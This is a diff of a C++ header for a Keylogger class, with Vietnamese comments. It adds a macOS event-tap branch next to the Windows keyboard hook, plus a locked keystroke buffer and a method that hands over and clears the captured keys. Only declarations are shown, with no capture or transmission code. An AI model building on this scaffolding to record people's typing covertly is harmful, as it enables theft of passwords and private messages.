@@ -1,6 +1,12 @@
 #pragma once
-#ifdef _WIN32
 #include "FeatureLibrary.h"
+#include <mutex>
+#include <string>
+#include <thread>
+#include <atomic>
+
+#ifdef __APPLE__
+#endif
 
 class Keylogger {
 private:
@@ -8,7 +14,7 @@ private:
     // Phải là static vì hàm Hook của Windows là hàm C thuần, 
     // không thể gọi biến thành viên của Class C++ bình thường được.
     
-    static HHOOK _hook;             // "Cái móc" để câu sự kiện bàn phím
+    //static HHOOK _hook;             // "Cái móc" để câu sự kiện bàn phím
     static std::string _buffer;     // Bộ nhớ đệm lưu tạm các phím vừa gõ
     static std::mutex _mtx;         // Cái khóa bảo vệ bộ nhớ đệm
     
@@ -18,12 +24,25 @@ private:
     // Hàm phụ để thêm chữ vào bộ đệm an toàn
     static void append(const std::string& str);
 
+    #ifdef _WIN32
+        static HHOOK _hook;
+        static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
+        void WinLoop();
+    #endif
+
+    #ifdef __APPLE__
+        CFMachPortRef eventTap = nullptr;
+        CFRunLoopSourceRef runLoopSource = nullptr;
+        
+        static CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon);
+        void MacLoop(); 
+    #endif
 public:
     Keylogger();
     ~Keylogger();
 
     // Hàm Callback (Hàm được Windows gọi mỗi khi có phím nhấn)
-    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
+    //static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 
     void Start(); // Bắt đầu theo dõi
     void Stop();  // Dừng theo dõi
@@ -31,4 +50,3 @@ public:
     // Hàm quan trọng: Lấy dữ liệu ra và xóa sạch bộ đệm cũ
     static std::string getDataAndClear();
 };
-#endif
